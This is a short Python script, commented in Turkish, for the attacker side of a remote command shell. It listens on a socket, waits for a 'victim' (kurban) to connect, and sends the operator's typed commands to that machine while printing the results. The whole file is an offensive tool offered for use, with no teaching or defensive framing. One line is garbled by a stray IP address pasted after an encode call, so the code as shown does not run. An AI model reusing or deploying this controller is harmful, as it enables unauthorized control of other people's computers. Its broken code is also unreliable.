import socket
import subprocess
from colorama import Fore, Back, init, Style
init(autoreset="true")

soket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
soket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
soket.bind(("192.168.56.1",7171))
soket.listen(1)
print(Fore.YELLOW+"kurbanin baglanti kurmasi bekleniyor ...")
kurban, ip=soket.accept()
print(Fore.GREEN+"kurban baglantisi saglandi !")
print(Fore.BLUE+"Kurban: %s" % str(ip))
print(Fore.BLACK+"[0] => programi sonlandir)")
while True:
    kod = input("*mesajinizi yaziniz: ")
    kod = kod.encode("utf-8")192.168.1.6
    kurban.send(kod)
    if(kod == b"0"):
        print(Fore.RED+"Server'dan cikildi")
        break
    else:
        sonuc = kurban.recv(1024)
        sonuc = sonuc.decode("utf-8")
        print(sonuc)
soket.close()  